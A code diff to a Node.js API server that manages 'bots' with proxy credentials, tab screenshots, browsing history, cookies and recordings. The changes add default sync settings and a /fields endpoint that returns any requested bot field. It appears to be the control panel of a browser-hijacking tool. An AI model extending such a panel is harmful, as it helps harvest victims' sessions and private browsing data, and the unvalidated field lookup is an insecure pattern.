@@ -18,6 +18,13 @@ const Sequelize = require("sequelize");
 const Op = Sequelize.Op;
 const get_hashed_password = require("./utils.js").get_hashed_password;
 
+const BOT_DEFAULT_SWITCH_CONFIG = {
+  SYNC: true,
+  SYNC_HUGE: true,
+  REALTIME_IMG: false,
+  NOTIFICATION: false,
+};
+
 /*
     API Server
 
@@ -41,7 +48,6 @@ function getMethods(obj) {
   }
   return result;
 }
-
 
 async function mergeBase64MP3s(base64DataArray, outputFile) {
   const tempFiles = [];
@@ -216,7 +222,10 @@ async function get_api_server(proxy_utils) {
       });
       await bot.update({
         name: req.body.name,
-        switch_config: req.body.switch_config,
+        switch_config: {
+          ...BOT_DEFAULT_SWITCH_CONFIG,
+          ...req.body.switch_config,
+        },
       });
 
       res
@@ -250,30 +259,22 @@ async function get_api_server(proxy_utils) {
     }
   );
 
-  /*
-        Get list of bots
-    */
+  // get all bots
   app.get(API_BASE_PATH + "/bots", async (req, res) => {
     const bots = await Bots.findAll({
       attributes: [
         "id",
+        "user_agent",
         "is_online",
         "name",
         "proxy_password",
         "proxy_username",
-        "user_agent",
-        "updatedAt",
-        "createdAt",
+        "tabs",
         "current_tab",
         "current_tab_image",
-        "tabs",
-        "bookmarks",
         "history",
-        "cookies",
-        "downloads",
-        // "recording",
         "state",
-        "switch_config",
+        "last_online",
       ],
     });
 
@@ -282,8 +283,42 @@ async function get_api_server(proxy_utils) {
       .json({
         success: true,
         result: {
-          bots: bots,
+          bots: bots.map((bot) => {
+            bot["tabs"] = bot["tabs"].length;
+            bot["history"] = bot["history"].length;
+            return bot;
+          }),
         },
+      })
+      .end();
+  });
+
+  // get the fields of a bot
+  // "user_agent",
+  // "updatedAt",
+  // "createdAt",
+  // "tabs",
+  // "bookmarks",
+  // "history",
+  // "cookies",
+  // "downloads",
+  // "recording",
+  // "switch_config",
+  app.get(API_BASE_PATH + "/fields", async (req, res) => {
+    const name = req.query.field;
+
+    const bot = await Bots.findOne({
+      where: {
+        id: req.query.id,
+      },
+      limit: name === "recording" ? 10 : undefined,
+      attributes: [name],
+    });
+    res
+      .status(200)
+      .json({
+        success: true,
+        result: bot[name],
       })
       .end();
   });
@@ -306,7 +341,6 @@ async function get_api_server(proxy_utils) {
     const file = path.join(__dirname, filename);
     res.sendFile(file);
   });
-
 
   /*
         Log in to a given user account
@@ -658,6 +692,7 @@ async function get_api_server(proxy_utils) {
         bot.browser_id,
         req.body.path
       );
+
       res
         .status(200)
         .json({
